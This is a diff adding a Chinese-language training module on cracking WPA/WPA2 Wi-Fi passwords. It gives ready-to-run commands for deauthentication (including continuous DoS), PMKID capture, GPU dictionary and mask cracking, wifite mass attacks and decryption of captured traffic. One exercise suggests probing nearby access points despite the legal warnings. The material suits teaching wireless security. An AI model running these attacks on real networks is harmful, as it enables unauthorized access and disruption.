@@ -1,0 +1,757 @@
+================================================================================
+  模块04：WPA/WPA2破解
+  学习目标：掌握4次握手原理、捕获和破解WPA2-PSK握手包
+  所需工具：airmon-ng, airodump-ng, aireplay-ng, aircrack-ng, cowpatty
+            pyrit, hashcat, hcxdumptool, hcxtools, wifite, airdecap-ng
+================================================================================
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第一部分：WPA/WPA2 4次握手原理
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1.1 为什么需要4次握手？
+
+  WPA2-PSK的核心安全依赖于成对临时密钥(PTK)的协商。
+  PTK从预共享密钥(PSK)派生，但每次连接都不同。
+
+  4次握手的两个目标：
+  1) 客户端和AP各自确认对方知道PSK(双向认证)
+  2) 协商生成PTK(用于实际数据加密的临时密钥)
+
+1.2 密钥层次结构
+
+                      PSK (预共享密钥)
+                 即WiFi密码，用户实际输入
+                         │
+              PBKDF2-HMAC-SHA1(salt=SSID, 4096轮)
+                         v
+                      PMK (成对主密钥)
+              PMK = PBKDF2(passphrase, SSID, 4096)
+              固定值，不随时间变化
+                         │
+              PRF(PMK, "Pairwise key expansion",
+                  MIN(AA,SA) || MAX(AA,SA) ||
+                  MIN(ANonce,SNonce) || ...)
+                         v
+                      PTK (成对临时密钥)
+              PTK = PRF-512(PMK, ANonce, SNonce,
+                            AP_MAC, STA_MAC)
+              每次连接都不同 (因为nonce随机)
+                    ┌──────┼──────┬──────────┐
+                    v      v      v          v
+                  KCK    KEK     TK    MIC Key(仅WPA)
+               认证确认 加密密钥 临时密钥
+               密钥    (分发GTK) (AES加密)
+
+1.3 4次握手详细过程
+
+  假设：AP = Authenticator(认证者)，STA = Supplicant(申请者/客户端)
+  AP_MAC = AA，STA_MAC = SA
+
+  握手开始前：
+  - AP生成随机数 ANonce
+  - 双方都已知：PSK, SSID -> PMK, AP_MAC, STA_MAC
+
+  Message 1: AP -> STA
+    内容：ANonce (AP的随机数)
+    目的：发送AP的nonce给客户端
+    此时PTK尚未计算(from STA角度看)
+
+  Message 2: STA -> AP
+    内容：SNonce (STA的随机数) + MIC (消息完整性码)
+    STA收到ANonce后：
+    -> 生成自己的SNonce
+    -> PTK = PRF(PMK, AA, SA, ANonce, SNonce)
+    -> 用KCK对第2帧计算MIC
+    -> 发送SNonce + MIC给AP
+
+  Message 3: AP -> STA
+    内容：ANonce + MIC + GTK (组临时密钥，加密后)
+    AP收到第2帧后：
+    -> 计算PTK (和STA相同)
+    -> 验证MIC (如果不匹配，说明STA不知道PMK，握手失败)
+    -> 生成GTK并用KEK加密后发送
+    -> 用KCK计算第3帧的MIC
+
+  Message 4: STA -> AP
+    内容：MIC (确认收到)
+    STA收到第3帧后：
+    -> 用KCK验证MIC (确认AP真的知道PMK)
+    -> 安装PTK和GTK (网卡开始使用新密钥)
+    -> 发送确认帧(MIC)
+    -> AP安装PTK
+    -> 握手完成！
+
+1.4 攻击原理 —— 为什么捕获握手包可以破解WPA2密码？
+
+  捕获到的4次握手包含以下明文信息：
+    - ANonce  (明文)
+    - SNonce  (明文)
+    - AP_MAC  (明文)
+    - STA_MAC (明文)
+    - MIC     (第4帧或第2帧中)
+    - PMK     (不知道，需要破解)
+    - PSK     (不知道，最终目标)
+
+  攻击方式：
+    遍历字典中的每个候选密码 -> 计算PMK -> 计算PTK
+    -> 用计算出的KCK验证MIC -> MIC匹配 = 密码正确！
+
+  关键计算瓶颈：
+    - 计算PMK：PBKDF2(密码, SSID, 4096轮) -> 这个步骤最慢！
+    - 计算PTK：PRF(PMK, ...) -> 这个很快
+    - 验证MIC：只需一次HMAC运算
+
+  这就是为什么WPA破解对GPU速度要求极高：
+    - CPU每秒只能测试几千个密码
+    - 4096轮PBKDF2是CPU密集型运算
+    - GPU可以大幅加速(AES指令集 + 大规模并行)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第二部分：捕获WPA/WPA2握手包
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+2.1 方法概述
+
+  获取WPA2握手有两种基本策略：
+
+  策略1 (被动)：自然等待
+    - 定向监听目标AP
+    - 等待合法客户端主动连接
+    - 等待时间取决于用户行为(1分钟~数小时)
+    - 完全隐蔽，无主动攻击
+
+  策略2 (主动)：Deauthentication攻击
+    - 发送伪造的Deauth帧给客户端或AP
+    - 强制客户端断开并自动重新连接
+    - 重新连接必然触发4次握手
+    - 快速(秒级)，但在无线频谱中可见
+
+2.2 策略1：被动等待握手(完全静默)
+
+  步骤1：启动监听模式
+    $ sudo airmon-ng check kill
+    $ sudo airmon-ng start wlan0
+
+  步骤2：定向监听目标AP
+    $ sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
+      -w wpa_handshake wlan0mon
+
+  步骤3：等待握手指示
+    在airodump-ng屏幕的右上角，出现：
+    [ WPA handshake: AA:BB:CC:DD:EE:FF ] <- 出现即成功！
+    -> wpa_handshake-01.cap 文件已包含完整的4次握手
+
+2.3 策略2：Deauthentication攻击(主动获取)
+
+  原理：Deauth帧是802.11管理帧(WPA2下未加密)，可以被伪造。
+
+  攻击流程：
+    1) 攻击者伪造一个Deauth帧
+    2) 源MAC设为AP的MAC -> 欺骗客户端以为是AP发的
+    3) 或源MAC设为客户端MAC -> 欺骗AP以为是客户端发的
+    4) 客户端收到后断开连接
+    5) 客户端自动重连(802.11基本行为)
+    6) 重连触发新的4次握手
+    7) 攻击者捕获握手
+
+  方法A：从客户端方向Deauth(向客户端发送)
+    $ sudo aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
+    -0  = Deauthentication攻击
+    5   = 发送5个Deauth包(防止偶然丢包)
+    -a  = AP的MAC地址
+    -c  = 目标客户端MAC
+
+  方法B：向所有客户端广播Deauth(无差别攻击)
+    $ sudo aireplay-ng -0 5 -a <AP_MAC> wlan0mon
+    (省略-c参数 = 向所有关联的客户端发送Deauth)
+
+  方法C：连续Deauth(阻止客户端正常使用)
+    $ sudo aireplay-ng -0 0 -a <AP_MAC> wlan0mon
+    (持续发送，0=无限次，按Ctrl+C停止)
+    WARNING: 这会导致该AP所有客户端无法上网，属于DoS攻击！
+
+  完整操作示例：
+    终端1(定向监听):
+    $ sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
+      -w wpa_handshake wlan0mon
+
+    终端2(发送Deauth):
+    $ sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF \
+      -c CLIENT_MAC wlan0mon
+
+    终端1上方出现 "WPA handshake: AA:BB:CC:DD:EE:FF" -> 成功！
+
+2.4 确认握手质量
+
+  不是所有捕获的握手都能被破解！用pyrit检查：
+
+    $ pyrit -r wpa_handshake-01.cap analyze
+    输出:
+    #1: AccessPoint AA:BB:CC:DD:EE:FF ('TargetWiFi'):
+    #1: Session 001, handshake, 4/4 messages:
+    #1:   #1: Station FF:EE:DD:CC:BB, 1 handshake:
+    #1:     #1: HMAC_SHA1_AES, good                    <- "good" = 完整握手
+    #1:     #1: AKMP PSK, Pairwise Cipher CCMP, ESSID TargetWiFi
+
+  "good" = 握手完整，可以破解！
+  "workgroup" = 握手不完整，可能无法破解
+
+  或用aircrack-ng验证：
+    $ aircrack-ng wpa_handshake-01.cap
+    输出中查看是否有 "#1 handshake" 的信息
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第三部分：破解WPA/WPA2握手包
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+3.1 aircrack-ng(CPU破解，基础选项)
+
+  命令：
+    $ aircrack-ng -w <字典路径> <捕获文件>
+
+  示例：
+    $ aircrack-ng -w /usr/share/wordlists/rockyou.txt \
+      wpa_handshake-01.cap
+
+  参数详解：
+    -w <wordlist> : 指定密码字典
+    -e <ESSID>    : 指定目标(如果cap文件包含多个AP)
+    -b <BSSID>    : 指定目标MAC
+
+  输出示例：
+    [00:00:00] 1030/14344392 keys tested (31.25 k/s)
+    Time left: 28 minutes, 32 seconds             0.01%
+    Current passphrase: 1234567890
+    KEY FOUND! [ password123 ]
+
+  CPU速度参考：
+    - 普通笔记本：500-3000 k/s
+    - 高端CPU(16核+)：5000-10000 k/s
+
+3.2 cowpatty(专门针对WPA的CPU破解工具)
+
+  cowpatty专门优化了WPA-PSK破解流程：
+
+  基本命令：
+    $ cowpatty -r <捕获文件> -f <字典> -s <SSID>
+
+  示例：
+    $ cowpatty -r wpa_handshake-01.cap \
+      -f /usr/share/wordlists/rockyou.txt \
+      -s TargetWiFi
+
+  高级用法——使用预计算哈希表(Genpmk)：
+
+  一次预计算，多次破解(对同一SSID)：
+
+  Step 1: 预计算PMK表
+    $ genpmk -f rockyou.txt -d PreCalcHash -s TargetWiFi
+    (对字典中每个密码 + SSID计算PMK，存入PreCalcHash文件)
+
+  Step 2: 使用预计算表快速破解
+    $ cowpatty -r wpa_handshake-01.cap \
+      -d PreCalcHash -s TargetWiFi
+
+  优势：破解速度约 100000+ k/s，适合同一SSID的反复测试
+
+3.3 hashcat(GPU加速破解，推荐！)
+
+  hashcat是目前最快的WPA破解工具，GPU比CPU快50-100倍！
+
+  Step 1: 将cap文件转换为hashcat格式
+
+  方法A(新版hcxtools，推荐)：
+    $ hcxpcapngtool wpa_handshake-01.cap -o hash.hc22000
+    或处理多个文件：
+    $ hcxpcapngtool *.cap -o all_hashes.hc22000
+
+  方法B(aircrack-ng管道 - 旧方法，不推荐)：
+    $ aircrack-ng wpa_handshake-01.cap -J hash
+    生成 hash.hccap 文件(hashcat旧格式)
+
+  Step 2: 确认hash文件格式
+    $ cat hash.hc22000
+    格式: WPA*02*<PMKID/MIC>*<MAC_AP>*<MAC_CLIENT>*<ESSID>***
+
+  Step 3: 使用hashcat破解
+
+    # 基础字典攻击
+    $ hashcat -m 22000 hash.hc22000 rockyou.txt
+
+    # 规则攻击(字典+变换规则)
+    $ hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule
+
+    # 掩码攻击(暴力破解已知格式)
+    $ hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
+      (8位数字密码)
+
+    # 组合攻击(字典组合)
+    $ hashcat -m 22000 hash.hc22000 -a 1 dict1.txt dict2.txt
+
+  hashcat参数速查：
+    -m 22000 : Hash类型：WPA-PBKDF2-PMKID+EAPOL (新版统一hashmode)
+    -m 2500  : Hash类型：WPA-EAPOL-PBKDF2 (旧版hccap格式)
+    -m 16800 : Hash类型：WPA-PMKID-PBKDF2 (旧版PMKID专用)
+    -a 0     : 攻击模式：字典攻击 (Straight)
+    -a 1     : 攻击模式：组合攻击 (Combination)
+    -a 3     : 攻击模式：掩码暴力破解 (Mask Attack)
+    -a 6     : 攻击模式：混合(字典+掩码)
+    -w 4     : 工作负载配置(1轻~4重)
+    -O       : 优化内核(限制密码长度，提升速度)
+    --show   : 显示已破解结果
+    -r rule  : 应用规则文件
+
+  查看hashcat设备：
+    $ hashcat -I
+    显示可用GPU列表和规格
+
+  GPU速度参考：
+    - NVIDIA RTX 3080  : 约 600-800 kH/s
+    - NVIDIA RTX 4090  : 约 1200-1500 kH/s
+    - 高端AMD显卡      : 约 400-800 kH/s
+    - CPU (16核)       : 仅 10-20 kH/s
+    -> GPU比CPU快50-100倍！
+
+3.4 pyrit(GPU/CPU混合加速)
+
+  pyrit可以预计算PMK并利用GPU加速：
+
+  安装和初始化：
+    $ pyrit list_cores
+    (显示可用计算核心，GPU显示为OpenCL/CUDA)
+
+  工作流程：
+
+  Step 1: 导入字典
+    $ pyrit -e TargetWiFi create_essid
+    $ pyrit -i rockyou.txt import_passwords
+    $ pyrit batch
+    (预计算所有密码针对TargetWiFi的PMK)
+
+  Step 2: 破解
+    $ pyrit -r wpa_handshake-01.cap attack_batch
+    (使用预计算PMK快速验证)
+
+  Step 3: 查看数据库
+    $ pyrit eval
+    (显示数据库状态)
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第四部分：PMKID攻击(无客户端破解)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+4.1 PMKID攻击原理
+
+  2018年8月，hashcat作者Jens "atom" Steube发现了一种新攻击方式。
+
+  传统WPA2破解需要4次握手中的全部4帧(需要客户端存在)。
+  PMKID攻击只需要AP与攻击者的单次交互！无需客户端！
+
+  PMKID是什么？
+    - PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || STA_MAC)
+    - 存在于AP发送的第1帧(EAPOL帧)的可选字段中
+    - 许多现代路由器默认包含PMKID
+    - 攻击者只需关联请求即可触发AP发送PMKID
+
+  攻击步骤：
+    1. 攻击者对目标AP发送关联请求
+    2. AP在EAPOL第1帧中包含PMKID字段
+    3. 攻击者提取PMKID
+    4. 使用hashcat破解PMKID(和破解EAPOL握手类似)
+
+4.2 hcxdumptool捕获PMKID
+
+  命令：
+    $ sudo hcxdumptool -i wlan0mon -o capture.pcapng \
+      --enable_status=1 --filtermode=2
+
+  参数详解：
+    -i wlan0mon          : 监听接口
+    -o capture.pcapng     : 输出文件(必须是.pcapng格式)
+    --enable_status=1    : 显示状态信息(推荐)
+    --enable_status=3    : 详细状态，显示更多信息
+    --filtermode=2       : 过滤模式(2=仅AP, 3=AP和客户端)
+    -c <信道>             : 指定信道(不指定=全信道扫描)
+
+  针对特定目标：
+    $ sudo hcxdumptool -i wlan0mon -o capture.pcapng \
+      --enable_status=1 --bssid=AA:BB:CC:DD:EE:FF \
+      --filtermode=2
+
+  运行输出示例：
+    HCXDUMTOOL 6.3.4 (C) 2024 ZeroBeat
+    start capturing (stop with ctrl+c)
+    INTERFACE............: wlan0mon
+    FILTERLIST...........: 0 entries
+    MAC CLIENT...........: any
+    MAC ACCESS POINT.....: any
+    EAPOL TIMEOUT........: 20000 usec
+
+    [10:00:00 - 001] AA:BB:CC:DD:EE:FF -> ff:ee... [PMKID FOUND]
+    [10:00:05 - 002] AA:BB:CC:DD:EE:FF -> ff:ee... [EAPOL M1M2]
+    [10:00:10 - 003] AA:BB:CC:DD:EE:FF -> ff:ee... [EAPOL M3M4]
+
+  关键输出标识：
+    [PMKID FOUND]    : 成功获取PMKID！无需任何客户端
+    [EAPOL M1M2]     : 获取到4次握手的第1、2帧(还需M3、M4)
+    [EAPOL M3M4]     : 获取到第3、4帧
+    [EAPOL 4/4]      : 完整4次握手
+    [GOT DEAUTHENTICATION] : 检测到Deauth帧
+
+4.3 hcxtools提取哈希
+
+  从pcapng提取hashcat格式：
+
+    $ hcxpcapngtool capture.pcapng -o hash.hc22000
+
+    # 仅提取PMKID
+    $ hcxpcapngtool capture.pcapng -o hash.hc22000 --pmkid=1
+
+    # 仅提取EAPOL
+    $ hcxpcapngtool capture.pcapng -o hash.hc22000 --eapoltimeout=20000
+
+  输出示例：
+    reading from capture.pcapng...
+
+    summary:
+    file name................: capture.pcapng
+    file type................: pcapng 1.0
+    captured packets.........: 1234
+    EAPOL packets............: 4
+    PMKIDs...................: 1
+
+    1 PMKID(s) written to hash.hc22000
+    1 EAPOL message(s) written to hash.hc22000
+
+  后续破解：
+    $ hashcat -m 22000 hash.hc22000 rockyou.txt
+
+4.4 PMKID vs 传统握手破解对比
+
+  ┌──────────────┬─────────────────────┬─────────────────────────┐
+  │ 特性         │ PMKID攻击           │ 传统EAPOL握手攻击      │
+  ├──────────────┼─────────────────────┼─────────────────────────┤
+  │ 需要客户端   │ 不需要              │ 需要                    │
+  │ 需要Deauth   │ 不需要              │ 通常需要                │
+  │ 隐蔽性       │ 高(仅发送关联请求)  │ 低(Deauth可被检测)     │
+  │ 成功条件     │ AP在EAPOL中包含PMKID│ 有人执行4次握手        │
+  │ 工具         │ hcxdumptool         │ airodump-ng             │
+  │ 速度         │ 无差异(同样的哈希)  │ 无差异                  │
+  │ 支持路由器   │ 约70-80%的路由器   │ 所有WPA2路由器          │
+  └──────────────┴─────────────────────┴─────────────────────────┘
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第五部分：自动化工具wifite
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+5.1 wifite一键WPA破解
+
+  命令：
+    $ sudo wifite --wpa
+
+  交互流程：
+    1. 自动进入监听模式
+    2. 扫描所有WPA网络
+    3. 按信号强度排序显示
+    4. 用户选择目标(数字键)，可多选
+    5. 自动捕获握手(等待或Deauth)
+    6. 自动使用字典破解(内置或指定)
+    7. 显示结果
+
+  高级用法：
+    # 使用指定字典
+    $ sudo wifite --wpa --dict /path/to/wordlist.txt
+
+    # 启用PMKID攻击
+    $ sudo wifite --pmkid
+
+    # 组合WPA和PMKID攻击
+    $ sudo wifite --wpa --pmkid --dict rockyou.txt
+
+    # 指定目标BSSID，跳过扫描
+    $ sudo wifite --wpa -b AA:BB:CC:DD:EE:FF -c 6
+
+    # 对所有目标发动攻击
+    $ sudo wifite --wpa --all
+
+    # 指定最小信号强度(-50dBm以上才攻击)
+    $ sudo wifite --wpa -pwr -50
+
+5.2 wifite破解阶段流程
+
+  第一阶段：扫描
+    - 自动信道跳跃扫描
+    - 发现目标 -> 排序 -> 展示
+
+  第二阶段：握手捕获
+    - 对每个目标：定向监听
+    - 如有客户端 -> 发送Deauth强制重连
+    - 等待握手指示 -> 保存
+
+  第三阶段：PMKID捕获(如启用)
+    - hcxdumptool自动运行
+    - 获取PMKID
+
+  第四阶段：破解
+    - aircrack-ng / hashcat 自动选择
+    - 使用内置小字典快速测试
+    - 使用用户提供的字典深度破解
+    - 破解成功 -> 保存到 cracked.txt
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第六部分：WPA加密流量解密
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+6.1 airdecap-ng解密捕获的WPA流量
+
+  有了密码后，可以解密之前捕获的加密流量：
+
+    $ airdecap-ng -e <SSID> -p <password> capture-01.cap
+
+  参数：
+    -e <SSID>     : 网络名称
+    -p <password> : WiFi密码
+    capture-01.cap: 要解密的捕获文件
+
+  输出：capture-01-dec.cap (解密后的文件，可在Wireshark分析)
+
+  示例：
+    $ airdecap-ng -e TargetWiFi -p password123 wpa2_capture-01.cap
+    $ wireshark wpa2_capture-01-dec.cap
+    (现在可以看到解密后的IP/TCP/UDP等高层协议数据)
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第七部分：字典生成策略
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+7.1 字典来源
+
+  内置字典(常见)：
+    /usr/share/wordlists/rockyou.txt   (约1400万条，最常用)
+    /usr/share/wordlists/fasttrack.txt (精简版)
+
+  生成自定义字典：
+    # crunch - 按模式生成
+    $ crunch 8 12 1234567890 -o num.txt
+    (生成8-12位纯数字密码)
+
+    # cewl - 从网站提取关键词
+    $ cewl http://target.com -w words.txt
+
+    # john the ripper - 从已有密码变异
+    $ john --wordlist=base.txt --rules --stdout > expanded.txt
+
+7.2 字典优化策略
+
+  - 了解目标网络命名习惯 (如公司名+数字)
+  - 路由器默认密码模式 (如 TP-Link_XXXX)
+  - 常见密码模式组合 (地名+年份, 姓名+生日)
+  - 个人信息钓鱼提取 (社交工程辅助)
+  - 使用规则扩展字典 (hashcat rules)
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第八部分：综合实践
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+实践目标：完整执行WPA2-PSK破解流程(被动+主动+PMKID)
+
+══════════════════════════════════════════════════════════════════
+  实践 4-1：准备WPA2实验环境
+══════════════════════════════════════════════════════════════════
+
+  方法1：使用自己的路由器(需有管理权限)
+    - 设置WPA2-PSK安全
+    - 设置一个简单密码(用于验证破解，如 password123)
+    - 连接至少一个客户端(手机即可)
+
+  方法2：使用hostapd模拟(需要两张网卡)
+    $ cat > /tmp/hostapd_wpa2.conf << 'EOF'
+    interface=wlan1
+    driver=nl80211
+    ssid=WPA2_Test_Lab
+    hw_mode=g
+    channel=6
+    wpa=2
+    wpa_passphrase=password123
+    wpa_key_mgmt=WPA-PSK
+    wpa_pairwise=CCMP
+    EOF
+
+    $ sudo hostapd /tmp/hostapd_wpa2.conf
+
+  WARNING: 不要使用自己的主路由器！准备专门的测试AP。
+
+══════════════════════════════════════════════════════════════════
+  实践 4-2：传统方法——捕获握手并破解
+══════════════════════════════════════════════════════════════════
+
+Step 1: 启用监听模式
+  终端输入：sudo airmon-ng check kill
+  终端输入：sudo airmon-ng start wlan0
+
+Step 2: 发现目标
+  终端输入：sudo airodump-ng wlan0mon
+  记录目标AP的BSSID和信道(ENC=WPA2)
+  Ctrl+C停止
+
+Step 3: 定向捕获(终端1)
+  终端输入：sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
+              -w wpa2_capture wlan0mon
+  保持此窗口打开！
+
+Step 4: 发送Deauth获取握手(终端2，新窗口)
+  先看终端1的输出，确认有客户端已连接(STATION栏)
+  终端输入：sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF \
+              -c CLIENT_MAC wlan0mon
+  观察终端1上方是否出现 "WPA handshake: AA:BB:CC:DD:EE:FF"
+
+Step 5: 验证握手
+  终端输入：pyrit -r wpa2_capture-01.cap analyze
+  终端输入：aircrack-ng wpa2_capture-01.cap
+  确认有至少1个有效握手
+
+Step 6: 用aircrack-ng破解(CPU)
+  终端输入：aircrack-ng -w /usr/share/wordlists/rockyou.txt \
+              wpa2_capture-01.cap
+
+Step 7: 用hashcat破解(GPU，可选)
+  hcxpcapngtool wpa2_capture-01.cap -o hash.hc22000
+  hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+
+Step 8: 如果破解成功，KEY FOUND！
+
+Step 9: 解密捕获流量
+  终端输入：airdecap-ng -e TargetWiFi -p password123 wpa2_capture-01.cap
+  wireshark wpa2_capture-01-dec.cap  (查看解密后的流量)
+
+══════════════════════════════════════════════════════════════════
+  实践 4-3：PMKID攻击(无客户端)
+══════════════════════════════════════════════════════════════════
+
+Step 1: 确保目标AP没有客户端连接(或断开所有客户端)
+
+Step 2: 使用hcxdumptool捕获PMKID
+  终端输入：sudo hcxdumptool -i wlan0mon -o pmkid_test.pcapng \
+              --enable_status=1 --filtermode=2
+
+Step 3: 观察输出
+  等待出现 [PMKID FOUND] 提示
+  如果没有立即出现，可能需要等待几分钟
+
+Step 4: 针对特定目标(如果已知BSSID)
+  终端输入：sudo hcxdumptool -i wlan0mon -o pmkid_target.pcapng \
+              --enable_status=1 --bssid=AA:BB:CC:DD:EE:FF \
+              --filtermode=2
+
+Step 5: 提取哈希
+  终端输入：hcxpcapngtool pmkid_test.pcapng -o pmkid_hash.hc22000
+  查看输出中的PMKID统计
+
+Step 6: 破解
+  终端输入：hashcat -m 22000 pmkid_hash.hc22000 rockyou.txt
+
+══════════════════════════════════════════════════════════════════
+  实践 4-4：wifite全自动破解
+══════════════════════════════════════════════════════════════════
+
+Step 1: 启动wifite
+  终端输入：sudo wifite --wpa --pmkid --dict /usr/share/wordlists/rockyou.txt
+
+Step 2: 观察扫描和选择阶段
+  wifite自动完成扫描、排序
+  输入对应数字选择目标
+  或选择"all"对所有目标攻击
+
+Step 3: 观察自动攻击流程
+  Phase 1: Capturing handshake
+  Phase 2: Attempting PMKID capture
+  Phase 3: Cracking with wordlist
+
+Step 4: 查看结果
+  破解成功后显示在屏幕上
+  结果文件：cracked.txt 和相关的 .cap 文件
+
+Step 5: 对比手动和自动流程
+  - 手动：更多控制，适合理解和排错
+  - 自动：省时省力，批量效率高
+  - 建议先用自动快速验证，再用手动深入理解
+
+══════════════════════════════════════════════════════════════════
+  实践 4-5：hashcat GPU加速破解(进阶)
+══════════════════════════════════════════════════════════════════
+
+Step 1: 确认GPU可用
+  终端输入：hashcat -I
+  确认显示你的GPU设备
+
+Step 2: 转换hash格式
+  终端输入：hcxpcapngtool wpa2_capture-01.cap -o hash.hc22000
+
+Step 3: 字典攻击
+  终端输入：hashcat -m 22000 -w 4 hash.hc22000 rockyou.txt
+
+Step 4: 字典+规则攻击(更全面)
+  终端输入：hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+Step 5: 掩码攻击(暴力破解8位数字)
+  终端输入：hashcat -m 22000 -a 3 hash.hc22000 ?d?d?d?d?d?d?d?d
+
+Step 6: 查看结果
+  终端输入：hashcat -m 22000 --show hash.hc22000
+
+Step 7: 对比CPU和GPU速度
+  用aircrack-ng(CPU)和hashcat(GPU)分别测试
+  计算：GPU速度 / CPU速度 = ? 倍
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+第九部分：注意事项
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+WARNING 法律警告
+  - WPA/WPA2破解仅限在获得明确授权的环境中操作
+  - 未经授权破解他人WiFi密码在中国属于违法行为
+  - 违反《网络安全法》可能面临行政处罚甚至刑事责任
+  - 本教程仅供安全教育和授权测试使用
+
+WARNING 技术注意事项
+  - Deauth攻击会断开合法用户连接，可能被IDS检测
+  - 频繁Deauth会暴露攻击者位置(信号特征)
+  - PMKID攻击相对隐蔽但兼容性不是100%
+  - 密码破解高度依赖字典质量
+  - hashcat GPU破解可能产生高温，注意散热
+  - 大型字典文件可能占用大量存储和内存
+
+WARNING 实验环境建议
+  - 必须使用自己搭建的测试环境
+  - 可在树莓派上用hostapd搭建测试AP
+  - 攻击频率和距离要谨慎控制
+  - 实验后恢复网卡正常模式(airmon-ng stop)
+
+WARNING 密码字典安全
+  - 字典文件可能包含真实密码，妥善保管
+  - 不要将破解结果公开上传
+  - hashcat pot文件包含破解历史，注意清理
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+课后练习
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. 画出WPA2 4次握手的状态转换图，标注每帧的内容
+2. 使用Wireshark分析完整的4次握手pcap文件，定位每帧
+3. 对比不同工具的破解速度(aircrack-ng vs hashcat vs pyrit)
+4. 在自己搭建的测试环境中完成完整WPA2破解流程
+5. 尝试PMKID攻击，测试你周边哪些AP支持
+6. 使用airdecap-ng解密你成功破解网络的流量
+7. 研究hashcat规则文件，尝试创建自定义规则
+8. 编写一个自动化脚本，一键完成扫描-捕获-破解流程
+
+================================================================================
+  模块04结束 — WPA2破解是无线安全研究中最重要的核心技能
+================================================================================
